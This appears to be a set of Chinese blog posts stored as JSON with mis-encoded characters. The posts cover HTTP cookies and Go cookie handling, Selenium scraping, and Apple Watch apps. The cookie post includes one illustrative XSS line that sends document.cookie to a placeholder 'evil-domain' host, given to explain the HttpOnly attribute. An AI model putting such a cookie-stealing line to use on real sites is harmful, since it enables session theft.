ä½œä¸ºå®¢æˆ·ç«¯å‚¨å­˜ã€‚è¿™æ ·åšè™½ç„¶å¯è¡Œï¼Œä½†æ˜¯å¹¶ä¸æ¨èã€‚\n\n### 1.1 cookie ä¿¡æ¯\n\n- Cookie çš„åå­—\n- Cookie çš„å€¼ï¼ˆçœŸæ­£çš„æ•°æ®å†™åœ¨è¿™é‡Œé¢ï¼‰\n- åˆ°æœŸæ—¶é—´\n- æ‰€å±åŸŸåï¼ˆé»˜è®¤æ˜¯å½“å‰åŸŸåï¼‰\n- ç”Ÿæ•ˆçš„è·¯å¾„ï¼ˆé»˜è®¤æ˜¯å½“å‰ç½‘å€ï¼‰\n\nä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è®¿é—®ç½‘å€`www.example.com`ï¼ŒæœåŠ¡å™¨åœ¨æµè§ˆå™¨å†™å…¥ä¸€ä¸ª cookieã€‚è¿™ä¸ª cookie å°±ä¼šåŒ…å«`www.example.com`è¿™ä¸ªåŸŸåï¼Œä»¥åŠæ ¹è·¯å¾„`/`ï¼Œè¿™ä¸ª cookie å¯¹è¯¥åŸŸåçš„æ ¹è·¯å¾„å’Œå®ƒçš„æ‰€æœ‰å­è·¯å¾„éƒ½æœ‰æ•ˆã€‚\n\nå¦‚æœè·¯å¾„è®¾ä¸º`/forums`ï¼Œé‚£ä¹ˆè¿™ä¸ªcookie åªæœ‰åœ¨è®¿é—®`www.example.com/forums`åŠå…¶å­è·¯å¾„æ—¶æ‰æœ‰æ•ˆã€‚ä»¥åï¼Œæµè§ˆå™¨ä¸€æ—¦è®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œæµè§ˆå™¨å°±ä¼šé™„ä¸Šè¿™æ®µ Cookie å‘é€ç»™æœåŠ¡å™¨ã€‚ \n\n### 1.2 cookie å±æ€§\n\n**è¿‡æœŸç›¸å…³ï¼šExpiresï¼ŒMax-Age**\n\n`Expires`å±æ€§æŒ‡å®šä¸€ä¸ªå…·ä½“çš„åˆ°æœŸæ—¶é—´ï¼Œåˆ°äº†æŒ‡å®šæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚å®ƒçš„å€¼æ˜¯ UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨`Date.prototype.toUTCString()`è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚\n\n```ini\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\nå¦‚æœä¸è®¾ç½®è¯¥å±æ€§ï¼Œæˆ–è€…è®¾ä¸º`null`ï¼ŒCookie åªåœ¨å½“å‰ä¼šè¯ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨çª—å£ä¸€æ—¦å…³é—­ï¼Œå½“å‰ä¼šè¯ç»“æŸï¼Œè¯¥ Cookie å°±ä¼šè¢«åˆ é™¤ã€‚\n\nå¦å¤–ï¼Œæµè§ˆå™¨æ ¹æ®æœ¬åœ°æ—¶é—´ï¼Œå†³å®š Cookie æ˜¯å¦è¿‡æœŸï¼Œç”±äºæœ¬åœ°æ—¶é—´æ˜¯ä¸ç²¾ç¡®çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä¿è¯ Cookie ä¸€å®šä¼šåœ¨æœåŠ¡å™¨æŒ‡å®šçš„æ—¶é—´è¿‡æœŸã€‚\n\n`Max-Age`å±æ€§æŒ‡å®šä»ç°åœ¨å¼€å§‹ Cookie å­˜åœ¨çš„ç§’æ•°ï¼Œæ¯”å¦‚`60 * 60 * 24 * 365`ï¼ˆå³ä¸€å¹´ï¼‰ã€‚è¿‡äº†è¿™ä¸ªæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚å¦‚æœåŒæ—¶æŒ‡å®šäº†`Expires`å’Œ`Max-Age`ï¼Œé‚£ä¹ˆ`Max-Age`çš„å€¼å°†ä¼˜å…ˆç”Ÿæ•ˆã€‚\n\n\n\nå¦‚æœ`Set-Cookie`å­—æ®µæ²¡æœ‰æŒ‡å®š`Expires`æˆ–`Max-Age`å±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie å°±æ˜¯ Session Cookieï¼Œå³å®ƒåªåœ¨æœ¬æ¬¡å¯¹è¯å­˜åœ¨ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¸ä¼šå†ä¿ç•™è¿™ä¸ª Cookieã€‚\n\n\n\n**åŸŸåå’Œè·¯å¾„ï¼šDomainï¼ŒPath**\n\n`Domain`å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›åŸŸåè¦é™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šè¯¥å±æ€§ï¼Œæµè§ˆå™¨ä¼šé»˜è®¤å°†å…¶è®¾ä¸ºå½“å‰ URL çš„ä¸€çº§åŸŸåï¼Œæ¯”å¦‚`www.example.com`ä¼šè®¾ä¸º`example.com`ï¼Œè€Œä¸”ä»¥åå¦‚æœè®¿é—®`example.com`çš„ä»»ä½•å­åŸŸåï¼ŒHTTP è¯·æ±‚ä¹Ÿä¼šå¸¦ä¸Šè¿™ä¸ª Cookieã€‚å¦‚æœæœåŠ¡å™¨åœ¨`Set-Cookie`å­—æ®µæŒ‡å®šçš„åŸŸåï¼Œä¸å±äºå½“å‰åŸŸåï¼Œæµè§ˆå™¨ä¼šæ‹’ç»è¿™ä¸ª Cookieã€‚\n\n\n\n`Path`å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›è·¯å¾„è¦é™„å¸¦è¿™ä¸ª Cookieã€‚åªè¦æµè§ˆå™¨å‘ç°ï¼Œ`Path`å±æ€§æ˜¯ HTTP è¯·æ±‚è·¯å¾„çš„å¼€å¤´ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šåœ¨å¤´ä¿¡æ¯é‡Œé¢å¸¦ä¸Šè¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ`PATH`å±æ€§æ˜¯`/`ï¼Œé‚£ä¹ˆè¯·æ±‚`/docs`è·¯å¾„ä¹Ÿä¼šåŒ…å«è¯¥ Cookieã€‚å½“ç„¶ï¼Œå‰ææ˜¯åŸŸåå¿…é¡»ä¸€è‡´ã€‚\n\n\n\n**å®‰å…¨ç›¸å…³ï¼šSecureï¼ŒHttpOnly**\n\n`Secure`å±æ€§æŒ‡å®šæµè§ˆå™¨åªæœ‰åœ¨åŠ å¯†åè®® HTTPS ä¸‹ï¼Œæ‰èƒ½å°†è¿™ä¸ª Cookie å‘é€åˆ°æœåŠ¡å™¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå½“å‰åè®®æ˜¯ HTTPï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¿½ç•¥æœåŠ¡å™¨å‘æ¥çš„`Secure`å±æ€§ã€‚è¯¥å±æ€§åªæ˜¯ä¸€ä¸ªå¼€å…³ï¼Œä¸éœ€è¦æŒ‡å®šå€¼ã€‚å¦‚æœé€šä¿¡æ˜¯ HTTPS åè®®ï¼Œè¯¥å¼€å…³è‡ªåŠ¨æ‰“å¼€ã€‚\n\n`HttpOnly`å±æ€§æŒ‡å®šè¯¥ Cookie æ— æ³•é€šè¿‡ JavaScript è„šæœ¬æ‹¿åˆ°ï¼Œä¸»è¦æ˜¯`Document.cookie`å±æ€§ã€`XMLHttpRequest`å¯¹è±¡å’Œ Request API éƒ½æ‹¿ä¸åˆ°è¯¥å±æ€§ã€‚è¿™æ ·å°±é˜²æ­¢äº†è¯¥ Cookie è¢«è„šæœ¬è¯»åˆ°ï¼Œåªæœ‰æµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¯¥ Cookieã€‚\n\n```ini\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\nä¸Šé¢æ˜¯è·¨ç«™ç‚¹è½½å…¥çš„ä¸€ä¸ªæ¶æ„è„šæœ¬çš„ä»£ç ï¼Œèƒ½å¤Ÿå°†å½“å‰ç½‘é¡µçš„ Cookie å‘å¾€ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ª Cookie çš„`HttpOnly`å±æ€§ï¼Œä¸Šé¢ä»£ç å°±ä¸ä¼šè¯»åˆ°è¯¥ Cookieã€‚\n\n### 1.3 ä½¿ç”¨æµç¨‹\n\n**1. å®¢æˆ·ç«¯å¼€å¯å’Œé™åˆ¶**\n\næµè§ˆå™¨å¯ä»¥è®¾ç½®ä¸æ¥å— Cookieï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸å‘æœåŠ¡å™¨å‘é€ Cookieã€‚`window.navigator.cookieEnabled`å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½ã€‚\n\n```bash\n// æµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½\nwindow.navigator.cookieEnabled // true\n```\n\n`document.cookie`å±æ€§è¿”å›å½“å‰ç½‘é¡µçš„ Cookieã€‚\n\n```bash\n// å½“å‰ç½‘é¡µçš„ Cookie\ndocument.cookie\n```\n\nåŒæµè§ˆå™¨å¯¹ cookie æ•°é‡å’Œå¤§å°çš„é™åˆ¶ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå•ä¸ªåŸŸåè®¾ç½®çš„ cookie ä¸åº”è¶…è¿‡30ä¸ªï¼Œæ¯ä¸ª cookie çš„å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚è¶…è¿‡é™åˆ¶ä»¥åï¼Œcookie å°†è¢«å¿½ç•¥ï¼Œä¸ä¼šè¢«è®¾ç½®ã€‚\n\næµè§ˆå™¨çš„åŒæºæ”¿ç­–è§„å®šï¼Œä¸¤ä¸ªç½‘å€åªè¦åŸŸåç›¸åŒå’Œç«¯å£ç›¸åŒï¼Œå°±å¯ä»¥å…±äº« cookieã€‚æ³¨æ„ï¼Œè¿™é‡Œä¸è¦æ±‚åè®®ç›¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ`http://example.com`è®¾ç½®çš„ cookieï¼Œå¯ä»¥è¢«`https://example.com`è¯»å–ã€‚\n\n**2. æœåŠ¡å™¨è®¾ç½®cookie**\n\næœåŠ¡å™¨å¦‚æœå¸Œæœ›åœ¨æµè§ˆå™¨ä¿å­˜ Cookieï¼Œå°±è¦åœ¨ HTTP å›åº”çš„å¤´ä¿¡æ¯é‡Œé¢ï¼Œæ”¾ç½®ä¸€ä¸ª`Set-Cookie`å­—æ®µã€‚\n\n```ini\nSet-Cookie:foo=bar\n```\n\nä¸Šé¢ä»£ç ä¼šåœ¨æµè§ˆå™¨ä¿å­˜ä¸€ä¸ªåä¸º`foo`çš„ Cookieï¼Œå®ƒçš„å€¼ä¸º`bar`ã€‚\n\nHTTP å›åº”å¯ä»¥åŒ…å«å¤šä¸ª`Set-Cookie`å­—æ®µï¼Œå³åœ¨æµè§ˆå™¨ç”Ÿæˆå¤šä¸ª Cookieã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```ini\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\né™¤äº† Cookie çš„å€¼ï¼Œ`Set-Cookie`å­—æ®µè¿˜å¯ä»¥é™„åŠ  Cookie çš„å±æ€§ã€‚\n\n```ini\nSet-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n```\n\nä¸€ä¸ª`Set-Cookie`å­—æ®µé‡Œé¢ï¼Œå¯ä»¥åŒæ—¶åŒ…æ‹¬å¤šä¸ªå±æ€§ï¼Œæ²¡æœ‰æ¬¡åºçš„è¦æ±‚ã€‚\n\n+ æ”¹å˜cookie\n\nå¦‚æœæœåŠ¡å™¨æƒ³æ”¹å˜ä¸€ä¸ªæ—©å…ˆè®¾ç½®çš„ Cookieï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼šCookie çš„`key`ã€`domain`ã€`path`å’Œ`secure`éƒ½åŒ¹é…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœåŸå§‹çš„ Cookie æ˜¯ç”¨å¦‚ä¸‹çš„`Set-Cookie`è®¾ç½®çš„ã€‚\n\n```ini\nSet-Cookie: key1=value1; domain=example.com; path=/blog\n```\n\næ”¹å˜ä¸Šé¢è¿™ä¸ª Cookie çš„å€¼ï¼Œå°±å¿…é¡»ä½¿ç”¨åŒæ ·çš„`Set-Cookie`ã€‚\n\n```ini\nSet-Cookie: key1=value2; domain=example.com; path=/blog\n```\n\n+ æ–°å¢cookie\n\nåªè¦æœ‰ä¸€ä¸ªå±æ€§ä¸åŒï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„ Cookieï¼Œè€Œä¸æ˜¯æ›¿æ¢æ‰åŸæ¥é‚£ä¸ª Cookieã€‚\n\n```ini\nSet-Cookie: key1=value2; domain=example.com; path=/\n```\n\nä¸Šé¢çš„å‘½ä»¤è®¾ç½®äº†ä¸€ä¸ªå…¨æ–°çš„åŒå Cookieï¼Œä½†æ˜¯`path`å±æ€§ä¸ä¸€æ ·ã€‚ä¸‹ä¸€æ¬¡è®¿é—®`example.com/blog`çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨å‘é€ä¸¤ä¸ªåŒåçš„ Cookieã€‚\n\n```ini\nCookie: key1=value1; key1=value2\n```\n\nä¸Šé¢ä»£ç çš„ä¸¤ä¸ª Cookie æ˜¯åŒåçš„ï¼ŒåŒ¹é…è¶Šç²¾ç¡®çš„ Cookie æ’åœ¨è¶Šå‰é¢ã€‚\n\n**3. å®¢æˆ·ç«¯å‘é€cookie**\n\næµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šå¸¦ä¸Šç›¸åº”çš„ Cookieã€‚æŠŠæœåŠ¡å™¨æ—©å‰ä¿å­˜åœ¨æµè§ˆå™¨çš„è¿™æ®µä¿¡æ¯ï¼Œå†ç»™åˆ°æœåŠ¡å™¨ã€‚è¿™æ—¶è¦ä½¿ç”¨ HTTP å¤´ä¿¡æ¯çš„`Cookie`å­—æ®µã€‚\n\n```ini\nCookie: foo=bar\n```\n\nä¸Šé¢ä»£ç ä¼šå‘æœåŠ¡å™¨å‘é€åä¸º`foo`çš„ Cookieï¼Œå€¼ä¸º`bar`ã€‚`Cookie`å­—æ®µå¯ä»¥åŒ…å«å¤šä¸ª Cookieï¼Œä½¿ç”¨åˆ†å·ï¼ˆ`;`ï¼‰åˆ†éš”ã€‚\n\n```ini\nCookie: name=value; name2=value2; name3=value3\n```\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```ini\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n### 1.4 document.cookie\n\n`document.cookie`å±æ€§ç”¨äºè¯»å†™å½“å‰ç½‘é¡µçš„ Cookieã€‚\n\nè¯»å–çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›å½“å‰ç½‘é¡µçš„æ‰€æœ‰ Cookieï¼Œå‰ææ˜¯è¯¥ Cookie ä¸èƒ½æœ‰`HTTPOnly`å±æ€§ã€‚\n\n```js\ndocument.cookie // \"foo=bar;baz=bar\"\n```\n\nä¸Šé¢ä»£ç ä»`document.cookie`ä¸€æ¬¡æ€§è¯»å‡ºä¸¤ä¸ª Cookieï¼Œå®ƒä»¬ä¹‹é—´ä½¿ç”¨åˆ†å·åˆ†éš”ã€‚å¿…é¡»æ‰‹åŠ¨è¿˜åŸï¼Œæ‰èƒ½å–å‡ºæ¯ä¸€ä¸ª Cookie çš„å€¼ã€‚\n\n```js\nvar cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n```\n\n`document.cookie`å±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒä¸ºå½“å‰ç½‘ç«™æ·»åŠ  Cookieã€‚\n\n```js\ndocument.cookie = 'fontSize=14';\n```\n\nå†™å…¥çš„æ—¶å€™ï¼ŒCookie çš„å€¼å¿…é¡»å†™æˆ`key=value`çš„å½¢å¼ã€‚æ³¨æ„ï¼Œç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ã€‚å¦å¤–ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¿…é¡»å¯¹åˆ†å·ã€é€—å·å’Œç©ºæ ¼è¿›è¡Œè½¬ä¹‰ï¼ˆå®ƒä»¬éƒ½ä¸å…è®¸ä½œä¸º Cookie çš„å€¼ï¼‰ï¼Œè¿™å¯ä»¥ç”¨`encodeURIComponent`æ–¹æ³•è¾¾åˆ°ã€‚\n\nä½†æ˜¯ï¼Œ`document.cookie`ä¸€æ¬¡åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼Œè€Œä¸”å†™å…¥å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯æ·»åŠ ã€‚\n\n```js\ndocument.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie  // test1=hello;test2=world\n```\n\n`document.cookie`è¯»å†™è¡Œä¸ºçš„å·®å¼‚ï¼ˆä¸€æ¬¡å¯ä»¥è¯»å‡ºå…¨éƒ¨ Cookieï¼Œä½†æ˜¯åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼‰ï¼Œä¸ HTTP åè®®çš„ Cookie é€šä¿¡æ ¼å¼æœ‰å…³ã€‚æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ Cookie çš„æ—¶å€™ï¼Œ`Cookie`å­—æ®µæ˜¯ä½¿ç”¨ä¸€è¡Œå°†æ‰€æœ‰ Cookie å…¨éƒ¨å‘é€ï¼›æœåŠ¡å™¨å‘æµè§ˆå™¨è®¾ç½® Cookie çš„æ—¶å€™ï¼Œ`Set-Cookie`å­—æ®µæ˜¯ä¸€è¡Œè®¾ç½®ä¸€ä¸ª Cookieã€‚\n\n\n\nå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€èµ·å†™å…¥ Cookie çš„å±æ€§ã€‚\n\n```js\ndocument.cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\";\n```\n\n\n\nä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼ŒåŒæ—¶è®¾ç½®äº†`expires`å±æ€§ã€‚å±æ€§å€¼çš„ç­‰å·ä¸¤è¾¹ï¼Œä¹Ÿæ˜¯ä¸èƒ½æœ‰ç©ºæ ¼çš„ã€‚\n\nå„ä¸ªå±æ€§çš„å†™å…¥æ³¨æ„ç‚¹å¦‚ä¸‹ã€‚\n\n- `path`å±æ€§å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œé»˜è®¤ä¸ºå½“å‰è·¯å¾„ã€‚\n- `domain`å±æ€§å€¼å¿…é¡»æ˜¯å½“å‰å‘é€ Cookie çš„åŸŸåçš„ä¸€éƒ¨åˆ†ã€‚æ¯”å¦‚ï¼Œå½“å‰åŸŸåæ˜¯`example.com`ï¼Œå°±ä¸èƒ½å°†å…¶è®¾ä¸º`foo.com`ã€‚è¯¥å±æ€§é»˜è®¤ä¸ºå½“å‰çš„ä¸€çº§åŸŸåï¼ˆä¸å«äºŒçº§åŸŸåï¼‰ã€‚\n- `max-age`å±æ€§çš„å€¼ä¸ºç§’æ•°ã€‚\n- `expires`å±æ€§çš„å€¼ä¸º UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨`Date.prototype.toUTCString()`è¿›è¡Œæ—¥æœŸæ ¼å¼è½¬æ¢ã€‚\n\n\n\n`document.cookie`å†™å…¥ Cookie çš„ä¾‹å­å¦‚ä¸‹ã€‚\n\n```ini\ndocument.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n```\n\nCookie çš„å±æ€§ä¸€æ—¦è®¾ç½®å®Œæˆï¼Œå°±æ²¡æœ‰åŠæ³•è¯»å–è¿™äº›å±æ€§çš„å€¼ã€‚\n\nåˆ é™¤ä¸€ä¸ªç°å­˜ Cookie çš„å”¯ä¸€æ–¹æ³•ï¼Œæ˜¯è®¾ç½®å®ƒçš„`expires`å±æ€§ä¸ºä¸€ä¸ªè¿‡å»çš„æ—¥æœŸã€‚\n\n```ini\ndocument.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œåä¸º`fontSize`çš„ Cookie çš„å€¼ä¸ºç©ºï¼Œè¿‡æœŸæ—¶é—´è®¾ä¸º1970å¹´1æœˆ1æœˆé›¶ç‚¹ï¼Œå°±ç­‰åŒäºåˆ é™¤äº†è¿™ä¸ª Cookieã€‚\n\n\n\n# 2. golang ä½¿ç”¨ cookie\n\n+ cookieçš„ç»“æ„ä½“å¦‚ä¸‹:\n\n```Â go\ntype Cookie struct {\n    Name  string\n    Value string\n\n    Path       string    // optional\n    Domain     string    // optional\n    Expires    time.Time // optional\n    RawExpires string    // for reading cookies only\n\n    // MaxAge=0 means no 'Max-Age' attribute specified.\n    // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'\n    // MaxAge>0 means Max-Age attribute present and given in seconds\n    MaxAge   int\n    Secure   bool\n    HttpOnly bool\n    Raw      string\n    Unparsed []string // Raw text of unparsed attribute-value pairs\n}\n```\n\n+ cookie æ“ä½œ\n\n```go\n//è®¾ç½®Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   3600 * 24,\n\t\tHttpOnly: true,\n\t})\n\n//è¯»å–Cookie\ncookie, err := req.Cookie(\"auth_token\")\n\n//åˆ é™¤Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   -1,\n\t\tHttpOnly: true,\n\t})\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://studygolang.com/articles/5905\n\n+ https://javascript.ruanyifeng.com/bom/cookie.html\n\n","tags":["cookie"],"categories":["web"]},{"title":"çˆ¬è™«åˆ©å™¨seleniumå’Œæ— å¤´æµè§ˆå™¨çš„ä½¿ç”¨","url":"%2Fp%2F545fa06.html","content":"\n\n\n### 0. å‰è¨€\n\nSelenium çš„åˆè¡·æ˜¯æ‰“é€ ä¸€æ¬¾ä¼˜ç§€çš„è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ï¼Œä½†æ˜¯æ…¢æ…¢çš„äººä»¬å°±å‘ç°ï¼ŒSelenium çš„è‡ªåŠ¨åŒ–ç”¨æ¥åšçˆ¬è™«æ­£åˆé€‚ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œä¼ ç»Ÿçš„çˆ¬è™«é€šè¿‡ç›´æ¥æ¨¡æ‹Ÿ HTTP è¯·æ±‚æ¥çˆ¬å–ç«™ç‚¹ä¿¡æ¯ï¼Œç”±äºè¿™ç§æ–¹å¼å’Œæµè§ˆå™¨è®¿é—®å·®å¼‚æ¯”è¾ƒæ˜æ˜¾ï¼Œå¾ˆå¤šç«™ç‚¹éƒ½é‡‡å–äº†ä¸€äº›åçˆ¬çš„æ‰‹æ®µï¼Œè€Œ Selenium æ˜¯é€šè¿‡æ¨¡æ‹Ÿæµè§ˆå™¨æ¥çˆ¬å–ä¿¡æ¯ï¼Œå…¶è¡Œä¸ºå’Œç”¨æˆ·å‡ ä¹ä¸€æ ·ï¼Œåçˆ¬ç­–ç•¥ä¹Ÿå¾ˆéš¾åŒºåˆ†å‡ºè¯·æ±‚åˆ°åº•æ˜¯æ¥è‡ª Selenium è¿˜æ˜¯çœŸå®ç”¨æˆ·ã€‚\n\n\n\né€šè¿‡ Selenium æ¥åšçˆ¬è™«ï¼Œä¸ç”¨å»åˆ†ææ¯ä¸ªè¯·æ±‚çš„å…·ä½“å‚æ•°ï¼Œæ¯”èµ·ä¼ ç»Ÿçš„çˆ¬è™«å¼€å‘èµ·æ¥æ›´å®¹æ˜“ã€‚Selenium çˆ¬è™«å”¯ä¸€çš„ä¸è¶³æ˜¯æ…¢ï¼Œå¦‚æœä½ å¯¹çˆ¬è™«çš„é€Ÿåº¦æ²¡æœ‰è¦æ±‚ï¼Œé‚£ä½¿ç”¨ Selenium æ˜¯ä¸ªéå¸¸ä¸é”™çš„é€‰æ‹©ã€‚\n\n<!-- more -->\n\n### 1. å®‰è£…å’Œä½¿ç”¨\n\n```bash\npip install selenium \n```\n\n\n\n##### 1.1 é¡µé¢æ“ä½œ\n\n```python\n# è¾“å…¥æ•°æ®\nbrowser.find_element_by_css_selector('.rfm input[name=\"username\"]').send_keys('123456')\n\n# é€‰æ‹©æ•°æ®\nbrowser.find_element_by_xpath(\"//select[@name='questionid']/option[text()='çˆ¶äº²çš„æ‰‹æœºå·ç ']\").click()\n\n# æ•²å›è½¦\nbrowser.find_element_by_css_selector('button[name=\"loginsubmit\"]').send_keys(Keys.ENTER)\n\n\n# åªç­‰3ç§’\nbrowser.implicitly_wait(3)\n\n# è·å–cookie\ncookies_list = driver.get_cookies()\ncookies_dict = {}\nfor cookie in cookies_list:\n    cookies_dict[cookie['name']] = cookie['value']\nprint(cookies_dict)\n```\n\n\n\n### 2. é‡åˆ°çš„é—®é¢˜\n\n\n\n##### 2.1 [ImportError: cannot import name 'webdriver'](https://stackoverflow.com/questions/29092970/importerror-cannot-import-name-webdriver)\n\næ–‡ä»¶ä¸èƒ½å‘½åä¸º`selenium`\n\n\n\n##### 2.2  Message: 'chromedriver' executable needs to be in PATH.\n\nä¸‹è½½é©±åŠ¨ https://sites.google.com/a/chromium.org/chromedriver/downloads\n\n\n\n##### 2.3 Message: unknown error: cannot find Chrome binary\n\n+ centos å®‰è£… chrome\n\n  ```bash\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm\n  sudo yum localinstall google-chrome-stable_current_x86_64.rpm\n  google-chrome --no-sandbox --version # çœ‹åˆ°ç‰ˆæœ¬åå»ä¸‹è½½ç›¸å…³çš„driver\n  ```\n\n+ ubuntu å®‰è£… chrome\n\n  ```\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\n  sudo apt install ./google-chrome-stable_current_amd64.deb\ngoogle-chrome --no-sandbox --version\n  ```\n  \n  \n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://cuiqingcai.com/2599.html\n\n+ [Python3ä¸­Seleniumä½¿ç”¨æ–¹æ³•](https://zhuanlan.zhihu.com/p/29435831)\n\n\n+ [ä½¿ç”¨ Python + Selenium æ‰“é€ æµè§ˆå™¨çˆ¬è™«](https://www.aneasystone.com/archives/2018/02/python-selenium-spider.html)","tags":["çˆ¬è™«"],"categories":["çˆ¬è™«"]},{"title":"applewatchä½¿ç”¨è½¯ä»¶å’Œé—®é¢˜","url":"%2Fp%2Ff8321ea6.html","content":"\n# 1. å¸¸ç”¨è½¯ä»¶\n\n### 1.1 å¥åº·ç±»\n\n+ autosleep ç¡çœ ã€‚ 25å…ƒä¹°æ–­ç»ˆèº«ï¼Œå¯ä»¥å’Œheartwatchä¸€èµ·è´­ä¹°ï¼Œä¸€å…±50å…ƒã€‚\n\n+ heart watch / heart analyzer  å¿ƒç‡åˆ†æã€‚\n\n+ keep è·‘æ­¥ã€‚\n\n<!-- more -->\n\n### 1.2 åŠŸèƒ½ç±»\n\n+ å½©äº‘å¤©æ°”\n\n\n\n# 2. åŠŸèƒ½ä½¿ç”¨\n\n### 2.1 watchæˆªå›¾\n\n+ åœ¨ iPhone ä¸Šæ‰“å¼€ã€ŒWatchã€åº”ç”¨ã€‚    è½»ç‚¹ã€Œæˆ‘çš„æ‰‹è¡¨ã€æ ‡ç­¾é¡µï¼Œç„¶åé€‰æ‹©ã€Œé€šç”¨ã€ å‘ä¸‹æ»‘åŠ¨ï¼Œé€‰æ‹©å¼€å¯ã€Œå¯ç”¨æˆªå±ã€\n+ åŒæŒ‡åŒæ—¶æŒ‰ä¸‹æ•°ç è¡¨å† å’Œä¾§è¾¹æŒ‰é’®å°±å¯ä»¥ä¸º Apple Watch æˆªå±ã€‚æˆªå›¾æˆåŠŸåï¼Œå›¾ç‰‡ä¼šè‡ªåŠ¨åŒæ­¥ä¿å­˜åˆ°é…å¯¹çš„ iPhone 